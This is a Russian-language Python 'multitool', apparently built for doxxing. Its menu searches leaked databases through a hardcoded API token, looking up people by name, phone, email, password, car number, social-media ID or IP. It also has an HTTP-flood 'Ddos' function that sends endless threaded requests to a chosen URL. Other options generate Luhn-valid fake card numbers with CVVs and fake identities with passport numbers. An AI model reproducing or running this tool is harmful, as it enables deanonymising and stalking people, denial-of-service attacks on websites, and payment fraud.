import os
import sys
import platform
import hashlib
import time
import pystyle
import requests
import psutil

import telebot
import asyncio
import threading
import random
from pystyle import Anime, Colors, Colorate, Box, Write, Center
import time
import ctypes
import requests
from urllib.parse import urlparse
from bs4 import BeautifulSoup
import whois
import sys
import os
import telebot
from telebot import *
import traceback

import string
from faker import Faker
import csv
import telebot
from telebot import types
import asyncio
import socket
import hashlib
import platform
import psutil
from telethon.sync import TelegramClient
from telethon.tl.functions.contacts import ImportContactsRequest
from telethon.tl.types import InputPhoneContact
from telethon import events
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from colorama import init, Fore, Style
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from tqdm import tqdm
from time import sleep
from fake_useragent import UserAgent
import requests
from datetime import datetime
from termcolor import colored
import colorama

def getwebsiteinfo(website):
        whoisdata = whois.whois(website)
        info = f"""
  |Информация о сайте: 
  |Домен: {whoisdata.domainname}
  |Зарегистрирован: {whoisdata.creationdate}
  |Истекает: {whoisdata.expirationdate}  
  |Владелец: {whoisdata.registrantname}
  |Организация: {whoisdata.registrantorganization}
  |Адрес: {whoisdata.registrantaddress}
  |Город: {whoisdata.registrantcity}
  |Штат: {whoisdata.registrantstate}
  |Почтовый индекс: {whoisdata.registrantpostalcode}
  |Страна: {whoisdata.registrantcountry}
  |IP-адрес: {whoisdata.nameservers}
    """
        Write.Print(info + "\n", Colors.red_to_purple, interval=0.005)


last_search_time = 0
def Search(Data):
    try:
        global last_search_time
        current_time = time.time()
        if current_time - last_search_time < 60:
            pystyle.Write.Print("\n[!] Подождите минуту перед следующим запросом\n", pystyle.Colors.red, interval=0.0001)
            return
        for database, info in requests.post("https://server.leakosint.com/", json={"token":"6361840631:hdR6wnPq", "request":Data, "limit":100, "lang":"ru"}).json()['List'].items():
            if "No results found" in database:
                pystyle.Write.Print("\n[!] Ничего не найдено\n", pystyle.Colors.green_to_white, interval = 0.0001)
                break
            pystyle.Write.Print("\n[@] База данных -> ", pystyle.Colors.green_to_white, interval = 0.0001)
            pystyle.Write.Print(database, pystyle.Colors.white, interval = 0.0001)
            pystyle.Write.Print("\n\n[@] Описание -> ", pystyle.Colors.green_to_white, interval = 0.0001)
            pystyle.Write.Print(f"{info['InfoLeak']}\n", pystyle.Colors.white, interval = 0.0001)
            for record in info['Data']:
                for key, value in record.items():
                    pystyle.Write.Print(f"\n[@] {key} -> ", pystyle.Colors.green_to_white, interval = 0.0001)
                    pystyle.Write.Print({value}, pystyle.Colors.white, interval = 0.0001)
            print()
        last_search_time = current_time
    except:
        pystyle.Write.Print("\n[!] Произошла ошибка\n", pystyle.Colors.red, interval = 0.0001)
if platform.system() == "Windows":
    os.system("cls")
else:
    os.system("clear")
if any("android" in value.lower() for value in os.environ.values()):
    pystyle.Write.Print(pystyle.Center.XCenter('''
  
▀█████████▄     ▄████████    ▄████████  ▄█      ███      ▄██████▄  ███▄▄▄▄   
  ███    ███   ███    ███   ███    ███ ███  ▀█████████▄ ███    ███ ███▀▀▀██▄ 
  ███    ███   ███    ███   ███    ███ ███▌    ▀███▀▀██ ███    ███ ███   ███ 
 ▄███▄▄▄██▀    ███    ███  ▄███▄▄▄▄██▀ ███▌     ███   ▀ ███    ███ ███   ███ 
▀▀███▀▀▀██▄  ▀███████████ ▀▀███▀▀▀▀▀   ███▌     ███     ███    ███ ███   ███ 
  ███    ██▄   ███    ███ ▀███████████ ███      ███     ███    ███ ███   ███ 
  ███    ███   ███    ███   ███    ███ ███      ███     ███    ███ ███   ███ 
▄█████████▀    ███    █▀    ███    ███ █▀      ▄████▀    ▀██████▀   ▀█   █▀  
                            ███    ███                                       

                                                                ░       
                    by ASORU | https://t.me/+_qoxj_DM7kowNWVi :3       
════════════════════════════════════════════════════════════════════════════════════════════════════════
[1] Поиск по почте            [7] Поиск по авто              [13]Инфа о сайте         [19]Поиск по MAC-адрес
[2] Поиск по ФИ               [8] Поиск по VIN               [14]Сложный пароль       [20]Ddos
[3] Поиск по ФИО              [9] Поиск по Telegram          [15]Порт сканер          [21]Вымышленная личность
[4] Поиск по нику             [10] Поиск по Facebook         [16]Странный текст       [22]Вымышленная карта
[5] Поиск по номеру           [11] Поиск по Instagram        [17]Выдать прокси        [23]Поиск по БД
[6] Поиск по паролю           [12] Поиск по IP               [18]Web-crawler          [24]Генератор номеров тел

                    [77] Инфо              [88] Зал Славы             [99] Выход'''), pystyle.Colors.blue_to_white, interval = 0.0001)
print()
print()
while True:
    choice = pystyle.Write.Input("[$] Введите номер функции -> ", pystyle.Colors.blue_to_white, interval = 0.005)
    print()
    if choice == "1":
        Data = pystyle.Write.Input("[$] Введите почту -> ", pystyle.Colors.blue_to_white, interval = 0.005)
        Search(Data)
        print()
    if choice == "2":
        Data = pystyle.Write.Input("[$] Введите ФИ -> ", pystyle.Colors.blue_to_white, interval = 0.005)
        Search(Data)
        print()
    if choice == "3":
        Data = pystyle.Write.Input("[$] Введите ФИО -> ", pystyle.Colors.blue_to_white, interval = 0.005)
        Search(Data)
        print()
    if choice == "4":
        Data = pystyle.Write.Input("[$] Введите ник -> ", pystyle.Colors.blue_to_white, interval = 0.005)
        Search(Data)
        print()
    if choice == "5":
        Data = pystyle.Write.Input("[$] Введите номер -> ", pystyle.Colors.blue_to_white, interval = 0.005)
        Search(Data)
        print()
    if choice == "6":
        Data = pystyle.Write.Input("[$] Введите пароль -> ", pystyle.Colors.blue_to_white, interval = 0.005)
        Search(Data)
        print()
    if choice == "7":
        Data = pystyle.Write.Input("[$] Введите номер авто -> ", pystyle.Colors.blue_to_white, interval = 0.005)
        Search(Data)
        print()
    if choice == "8":
        Data = pystyle.Write.Input("[$] Введите VIN -> ", pystyle.Colors.green_to_white, interval = 0.005)
        Search(Data)
        print()
    if choice == "9":
        Data = pystyle.Write.Input("[$] Введите Telegram ID -> ", pystyle.Colors.green_to_white, interval = 0.005)
        Search(Data)
        print()
    if choice == "10":
        Data = pystyle.Write.Input("[$] Введите Facebook ID -> ", pystyle.Colors.green_to_white, interval = 0.005)
        Search(Data)
        print()
    if choice == "11":
        Data = pystyle.Write.Input("[$] Введите Instagram ID -> ", pystyle.Colors.blue_to_white, interval = 0.005)
        Search(Data)
        print()
    if choice == "12":
        Data = pystyle.Write.Input("[$] Введите IP -> ", pystyle.Colors.blue_to_white, interval = 0.005)
        Search(Data)
        print()
    if choice == "77":
        pystyle.Write.Print("[$] Владелец и его команда не несет ответственности за ваши действия", pystyle.Colors.red, interval = 0.005)
        print()
        print()
    if choice == "88":
        pystyle.Write.Print("""[+]Мои пупсики: @CTPAX_BCEX_TPOLEYY @mvdD3kord @peopledeanon @bogogenius @w1lpyygod купите мне премиум ишаки
        """, pystyle.Colors.blue_to_white, interval = 0.005)
        print()
        print()
    if choice == '13':
        domain = Write.Input("Введите домен сайта: ", Colors.blue_to_white, interval=0.005)
        getwebsiteinfo(domain)

    if choice == '14':
        def get_characters(strength):
            characters = string.ascii_letters + string.digits
            if strength == "medium":
                characters += "!@#$%^&*()qwertyuiopasdfghjklzxcvbnm,./;[]йцукенгшщзхъфывапролдячсмить"
            elif strength == "high":
                characters += string.punctuation
            return characters
        def generate_password(length, strength):
            characters = get_characters(strength)
            password = ''.join(random.choice(characters) for i in range(length))
            return password
        password_length = int(Write.Input('Введите длину пароля: ', Colors.green_to_white, interval=0.005))
        complexity = Write.Input('Выберите сложность (low, medium, high): ', Colors.green_to_white, interval=0.005)
        complex_password = generate_password(password_length, complexity)
        Write.Print(complex_password + "\n", Colors.green_to_white, interval=0.005)

    if choice == '15':
                pystyle.Write.Print("\n[$] Выберите режим: ", pystyle.Colors.green_to_white, interval=0.005)
                pystyle.Write.Print("\n\n[$] 1 - проверить часто используемые порты", pystyle.Colors.green_to_white, interval=0.005)
                pystyle.Write.Print("\n\n[$] 2 - проверить указанный порт", pystyle.Colors.green_to_white, interval=0.005)
                mode = pystyle.Write.Input("\n\n[$] Ваш выбор: ", pystyle.Colors.green_to_white, interval=0.005)
                if mode == "1":
                    print()
                    ports = [
                        20,
                        26,
                        28,
                        29,
                        55,
                        53,
                        80,
                        110,
                        443,
                        8080,
                        1111,
                        1388,
                        2222,
                        1020,
                        4040,
                        6035,
                    ]
                    for port in ports:
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        result = sock.connect_ex(("127.0.0.1", port))
                        if result == 0:
                            pystyle.Write.Print(f"[$] Порт {port} открыт", pystyle.Colors.green_to_white, interval=0.005)
                        else:
                            pystyle.Write.Print(f"[$] Порт {port} закрыт", pystyle.Colors.green_to_white, interval=0.005)
                        sock.close()
                        print()
                elif mode == "2":
                    port = pystyle.Write.Input("\n[$] Введите номер порта: ", pystyle.Colors.green_to_white, interval=0.005)
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    result = sock.connect_ex(("127.0.0.1", int(port)))
                    print()
                    if result == 0:
                        pystyle.Write.Print(f"[$] Порт {port} открыт", pystyle.Colors.green_to_white, interval=0.005)
                    else:
                        pystyle.Write.Print(f"[$] Порт {port} закрыт", pystyle.Colors.green_to_white, interval=0.005)
                    sock.close()
                    print()
                else:
                    pystyle.Write.Print("\n[$] Неизвестный режим", pystyle.Colors.green_to_white, interval=0.005)
                    print()
    if choice == "16":
                def transform_text(input_text):
                    translit_dict = {
                        "а": "@",
                        "б": "Б",
                        "в": "B",
                        "г": "г",
                        "д": "д",
                        "е": "е",
                        "ё": "ё",
                        "ж": "ж",
                        "з": "3",
                        "и": "u",
                        "й": "й",
                        "к": "K",
                        "л": "л",
                        "м": "M",
                        "н": "H",
                        "о": "0",
                        "п": "п",
                        "р": "P",
                        "с": "c",
                        "т": "T",
                        "у": "y",
                        "ф": "ф",
                        "х": "X",
                        "ц": "ц",
                        "ч": "4",
                        "ш": "ш",
                        "щ": "щ",
                        "ъ": "ъ",
                        "ы": "ы",
                        "ь": "ь",
                        "э": "э",
                        "ю": "ю",
                        "я": "я",
                        "А": "A",
                        "Б": "6",
                        "В": "V",
                        "Г": "r",
                        "Д": "D",
                        "Е": "E",
                        "Ё": "Ё",
                        "Ж": "Ж",
                        "З": "2",
                        "И": "I",
                        "Й": "Й",
                        "К": "K",
                        "Л": "Л",
                        "М": "M",
                        "Н": "H",
                        "О": "O",
                        "П": "П",
                        "Р": "P",
                        "С": "C",
                        "Т": "T",
                        "У": "Y",
                        "Ф": "Ф",
                        "Х": "X",
                        "Ц": "Ц",
                        "Ч": "Ч",
                        "Ш": "Ш",
                        "Щ": "Щ",
                        "Ъ": "Ъ",
                        "Ы": "bl",
                        "Ь": "b",
                        "Э": "Э",
                        "Ю": "9Y",
                        "Я": "9A",
                    }
                    transformed_text = []
                    for char in input_text:
                        if char in translit_dict:
                            transformed_text.append(translit_dict[char])
                        else:
                            transformed_text.append(char)
                    return "".join(transformed_text)
                input_text = pystyle.Write.Input("\n[$] Введите текст -> ", pystyle.Colors.green_to_white, interval=0.005)
                transformed_text = transform_text(input_text)
                print()
                pystyle.Write.Print("[$] Результат -> " + transformed_text + "\n", pystyle.Colors.green_to_white, interval=0.005)
                
    if choice == "17":
                def get_proxy():
                    proxy_api_url = "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all"

                    try:
                        response = requests.get(proxy_api_url)
                        if response.status_code == 200:
                            proxy_list = response.text.strip().split("\r\n")
                            return proxy_list
                        else:
                            pystyle.Write.Print(f"\nПроизошла ошибка -> {response.status_code}", pystyle.Colors.green_to_white, interval=0.005)
                    except Exception as e:
                        pystyle.Write.Print(f"\nПроизошла ошибка -> {str(e)}", pystyle.Colors.green_to_white, interval=0.005)

                    return None

                proxies = get_proxy()
                if proxies:
                    pystyle.Write.Print("\nПрокси:\n", pystyle.Colors.green_to_white, interval=0.005)
                    for proxy in proxies:
                        pystyle.Write.Print("\n" + proxy, pystyle.Colors.green_to_white, interval=0.005)
                    print()
                else:
                    pystyle.Write.Print("Прокси недоступно.", pystyle.Colors.green_to_white, interval=0.005)
    import requests
    import urllib.parse
    import bs4
    import pystyle

    if choice == "18":
        start_url = pystyle.Write.Input("[$] Введите ссылку -> ", pystyle.Colors.green_to_white, interval=0.005)
        max_depth = 2
        visited = set()


        def crawl(url, depth=0):
            if depth > max_depth:
                return
            parsed = urllib.parse.urlparse(url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            if url in visited:
                return
            try:
                response = requests.get(url)
                html = response.text
                soup = bs4.BeautifulSoup(html, "html.parser")
            except Exception as e:
                print(f"Ошибка при обработке {url}: {e}")
                return
            visited.add(url)
            pystyle.Write.Print("[$] " + url + "\n", pystyle.Colors.green_to_white, interval=0.005)
            for link in soup.find_all("a"):
                href = link.get("href")
                if not href:
                    continue
                href = href.split("#")[0].rstrip("/")
                if href.startswith("http"):
                    href_parsed = urllib.parse.urlparse(href)
                    if href_parsed.netloc != parsed.netloc:
                        continue
                else:
                    href = domain + href
                crawl(href, depth + 1)


        print()
        crawl(start_url)

    if choice == "19":
                def mac_lookup(mac_address):
                    api_url = f"https://api.macvendors.com/{mac_address}"
                    try:
                        response = requests.get(api_url)
                        if response.status_code == 200:
                            return response.text.strip()
                        else:
                            return f"Error: {response.status_code} - {response.text}"
                    except Exception as e:
                        return f"Error: {str(e)}"
                mac_address = pystyle.Write.Input("[?] Введите Mac-Address -> ", pystyle.Colors.green_to_white, interval = 0.005)  # Replace this with the MAC address you want to lookup
                vendor = mac_lookup(mac_address)
                pystyle.Write.Print(f"Vendor: {vendor}", pystyle.Colors.green_to_white, interval = 0.005)

    import threading
    import random
    import requests
    import pystyle
    import colorama
    import concurrent.futures


    def send_request(url, user_agents, i):
        user_agent = random.choice(user_agents)
        headers = {"User-Agent": user_agent}
        try:
            response = requests.get(url, headers=headers)
            pystyle.Write.Print(f"[+] Request {i} sent successfully\n", pystyle.Colors.green_to_white, interval=0.005)
        except Exception as e:
            pystyle.Write.Print(f"[+] Request {i} failed: {e}\n", pystyle.Colors.green_to_white, interval=0.005)


    def dos_attack(url, power):
        def generate_user_agent():
            versions = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
                "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.{0}; rv:{1}.0) Gecko/20{2:02d}{3:02d} Firefox/{1}.0",
                "Mozilla/5.0 (X11; Linux x86_64; rv:{0}.0) Gecko/{0}{1:02d} Firefox/{0}.0",
            ]
            version = random.randint(60, 90)
            year = random.randint(10, 21)
            month = random.randint(1, 12)
            user_agent = random.choice(versions).format(version, year, year, month)
            return user_agent

        def make_request(url):
            headers = {
                'User-Agent': generate_user_agent()
            }
            response = requests.get(url, headers=headers)
            pystyle.Write.Print(
                f"[{colorama.Fore.WHITE}${colorama.Fore.GREEN}] Атака началась, состояние сайта: {response.status_code}\n",
                pystyle.Colors.green_to_white, interval=0.005)

        max_workers = {"1": 30, "2": 50, "3": 100}.get(power, 30)
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            while True:
                executor.submit(make_request, url)


    if choice == "20":
        mode = input(f"""[{colorama.Fore.WHITE}${colorama.Fore.GREEN}]Выберите режим:
    1 - Normal
    2 - PRO
    {colorama.Fore.WHITE}:{colorama.Fore.GREEN}""")
        if mode == "1":
            url = pystyle.Write.Input("[$] URL: ", pystyle.Colors.green_to_white, interval=0.005)
            num_requests = int(
                pystyle.Write.Input("[$] Введите количество запросов: ", pystyle.Colors.green_to_white, interval=0.005))
            user_agents = [
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
                "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
            ]
            threads = []
            for i in range(1, num_requests + 1):
                t = threading.Thread(target=send_request, args=(url, user_agents, i))
                t.start()
                threads.append(t)
            for t in threads:
                t.join()
        elif mode == "2":
            url = pystyle.Write.Input(f"[$] Введите ссылку: ", pystyle.Colors.green_to_white, interval=0.005)
            power = pystyle.Write.Input(f"[$] Выберите режим (1 - Слабый/2 - Средний/3 - Мощный): ",
                                        pystyle.Colors.green_to_white, interval=0.005)
            try:
                dos_attack(url, power)
            except Exception as e:
                pystyle.Write.Print(f"[$] Произошла ошибка! Проверьте ввод данных! {e}\n",
                                    pystyle.Colors.green_to_white, interval=0.005)
        else:
            pystyle.Write.Print("[$] Неизвестный режим\n", pystyle.Colors.green_to_white, interval=0.005)

    import random
    import faker
    import pystyle

    if choice == "21":
        fake = faker.Faker(locale="ru_RU")
        gender = pystyle.Write.Input("\n[$] Введите пол (М - мужской, Ж - женский): ", pystyle.Colors.green_to_white,
                                     interval=0.005)
        print()

        if gender not in ["М", "Ж"]:
            gender = random.choice(["М", "Ж"])
            pystyle.Write.Print(f"[$] Вы ввели неверное значение, будет выбрано случайным образом: {gender}\n\n",
                                pystyle.Colors.green_to_white, interval=0.005)

        if gender == "М":
            first_name = fake.first_name_male()
            middle_name = fake.middle_name_male()
        else:
            first_name = fake.first_name_female()
            middle_name = fake.middle_name_female()

        last_name = fake.last_name()
        full_name = f"{last_name} {first_name} {middle_name}"
        birthdate = fake.date_of_birth()
        age = fake.random_int(min=18, max=80)
        street_address = fake.street_address()
        city = fake.city()
        region = fake.region()
        postcode = fake.postcode()
        address = f"{street_address}, {city}, {region} {postcode}"
        email = fake.email()
        phone_number = fake.phone_number()
        inn = str(fake.random_number(digits=12, fix_len=True))
        snils = str(fake.random_number(digits=11, fix_len=True))
        passport_num = str(fake.random_number(digits=10, fix_len=True))
        passport_series = fake.random_int(min=1000, max=9999)

        pystyle.Write.Print(f"[$] ФИО: {full_name}\n", pystyle.Colors.green_to_white, interval=0.005)
        pystyle.Write.Print(f"[$] Пол: {gender}\n", pystyle.Colors.green_to_white, interval=0.005)
        pystyle.Write.Print(f"[$] Дата рождения: {birthdate.strftime('%d %B %Y')}\n", pystyle.Colors.green_to_white,
                            interval=0.005)
        pystyle.Write.Print(f"[$] Возраст: {age} лет\n", pystyle.Colors.green_to_white, interval=0.005)
        pystyle.Write.Print(f"[$] Адрес: {address}\n", pystyle.Colors.green_to_white, interval=0.005)
        pystyle.Write.Print(f"[$] Email: {email}\n", pystyle.Colors.green_to_white, interval=0.005)
        pystyle.Write.Print(f"[$] Телефон: {phone_number}\n", pystyle.Colors.green_to_white, interval=0.005)
        pystyle.Write.Print(f"[$] ИНН: {inn}\n", pystyle.Colors.green_to_white, interval=0.005)
        pystyle.Write.Print(f"[$] СНИЛС: {snils}\n", pystyle.Colors.green_to_white, interval=0.005)
        pystyle.Write.Print(f"[$] Паспорт серия: {passport_series} номер: {passport_num}\n",
                            pystyle.Colors.green_to_white, interval=0.005)
                            
    if choice == "22":
                pystyle.Write.Print("\n[$] Выберите страну:\n", pystyle.Colors.green_to_white, interval=0.005)
                pystyle.Write.Print("[$] 1: Украина\n", pystyle.Colors.green_to_white, interval=0.005)
                pystyle.Write.Print("[$] 2: Россия\n", pystyle.Colors.green_to_white, interval=0.005)
                pystyle.Write.Print("[$] 3: Казахстан\n", pystyle.Colors.green_to_white, interval=0.005)        
                country_choice = pystyle.Write.Input("\n[?] Ваш выбор: ", pystyle.Colors.green_to_white, interval=0.005)        

                if country_choice == "1":
                    country = "Украина"
                elif country_choice == "2":
                    country = "Россия"
                elif country_choice == "3":
                    country = "Казахстан"
                else:
                    pystyle.Write.Print("\n[$] Неправильный ввод.\n", pystyle.Colors.green_to_white, interval=0.005)

                def generate_card_number():
                    bin_number = "4"  
                    for _ in range(5):
                        bin_number += str(random.randint(0, 9))

                    account_number = ''.join(str(random.randint(0, 9)) for _ in range(9))
                    card_number = bin_number + account_number
                    checksum = generate_checksum(card_number)
                    card_number += str(checksum)

                    return card_number

                def generate_checksum(card_number):
                    digits = [int(x) for x in card_number]
                    odd_digits = digits[-2::-2]
                    even_digits = digits[-1::-2]
                    checksum = sum(odd_digits)
                    for digit in even_digits:
                        checksum += sum(divmod(digit * 2, 10))
                    return (10 - checksum % 10) % 10

                def generate_expiry_date():
                    month = random.randint(1, 12)
                    year = random.randint(24, 30)  
                    return "{:02d}/{:02d}".format(month, year)

                def generate_cvv():
                    return ''.join(str(random.randint(0, 9)) for _ in range(3))

                def generate_random_card(country):
                    card_number = generate_card_number()
                    expiry_date = generate_expiry_date()
                    cvv = generate_cvv()
                    return {
                        "Страна": country,
                        "Номер карты": card_number,
                        "Срок действия": expiry_date,
                        "CVV": cvv
                    }

                card = generate_random_card(country)
                pystyle.Write.Print("\n[$] Страна: " + card["Страна"], pystyle.Colors.green_to_white, interval=0.005)
                pystyle.Write.Print("\n[$] Номер карты: " + card["Номер карты"], pystyle.Colors.green_to_white, interval=0.005)
                pystyle.Write.Print("\n[$] Срок действия: " + card["Срок действия"], pystyle.Colors.green_to_white, interval=0.005)
                pystyle.Write.Print("\n[$] CVV: " + card["CVV"] + "\n", pystyle.Colors.green_to_white, interval=0.005)
    if choice == "5":
                path = pystyle.Write.Input("\n[$] Введите путь к БД: ", pystyle.Colors.green_to_white, interval=0.005)
                search_text = pystyle.Write.Input("\n[?] Введите текст:  ", pystyle.Colors.green_to_white, interval=0.005)
                print()
                try:
                    with open(path, "r", encoding="utf-8") as f:
                        for line in f:
                            if search_text in line:
                                pystyle.Write.Print("[$] Результат: " + line.strip(), pystyle.Colors.green_to_white, interval=0.005)
                                print()
                                break
                        else:
                            pystyle.Write.Print("[$] Текст не найден.\n", pystyle.Colors.green_to_white, interval=0.005)
                except:
                    try:
                        with open(path, "r", encoding="cp1251") as f:
                            for line in f:
                                if search_text in line:
                                    pystyle.Write.Print("[$] Результат: " + line.strip(), pystyle.Colors.green_to_white, interval=0.005)
                                    print()
                                    break
                            else:
                                pystyle.Write.Print("[$] Текст не найден.\n", pystyle.Colors.green_to_white, interval=0.005)
                    except:
                        try:
                            with open(path, "r", encoding="cp1252") as f:
                                for line in f:
                                    if search_text in line:
                                        pystyle.Write.Print("[$] Результат: " + line.strip(), pystyle.Colors.green_to_white, interval=0.005)
                                        print()
                                        break
                                else:
                                    pystyle.Write.Print("[$] Текст не найден.\n", pystyle.Colors.green_to_white, interval=0.005)
                        except:
                            pystyle.Write.Print(f"[$] Произошла ошибка, проверьте ввод данных\n", pystyle.Colors.green_to_white, interval=0.005)

    import random
    import pystyle


    def generate_phone_number(country_code):
        if country_code == "1":
            return f"+1 {random.randint(200, 999)}-{random.randint(200, 999)}-{random.randint(1000, 9999)}"
        elif country_code == "2":
            return f"+7 {random.randint(900, 999)} {random.randint(100, 999)}-{random.randint(10, 99)}-{random.randint(10, 99)}"
        elif country_code == "3":
            return f"+7 {random.randint(700, 709)} {random.randint(100, 999)}-{random.randint(10, 99)}-{random.randint(10, 99)}"
        elif country_code == "4":
            return f"+375 {random.randint(25, 33)} {random.randint(100, 999)}-{random.randint(100, 999)}"
        elif country_code == "5":
            return f"+234 {random.randint(700, 799)} {random.randint(100, 999)}-{random.randint(1000, 9999)}"
        else:
            return None


    if choice == "24":
        country_code = pystyle.Write.Input(
            "\n[$] Выберите страну:\n1 - США\n2 - Россия\n3 - Казахстан\n4 - Беларусь\n5 - Нигерия\nВаш выбор: ",
            pystyle.Colors.green_to_white, interval=0.005)
        phone_number = generate_phone_number(country_code)

        country_names = {
            "1": "США",
            "2": "Россия",
            "3": "Казахстан",
            "4": "Беларусь",
            "5": "Нигерия"
        }
        country = country_names.get(country_code, "неизвестно")

        if phone_number:
            pystyle.Write.Print(f"[$] Сгенерированный номер для {country}: {phone_number}\n",
                                pystyle.Colors.green_to_white, interval=0.005)
        else:
            pystyle.Write.Print(f"[$] Неверно указан номер страны: {country_code}\n", pystyle.Colors.green_to_white,
                                interval=0.005)

    if choice == "99":
        sys.exit()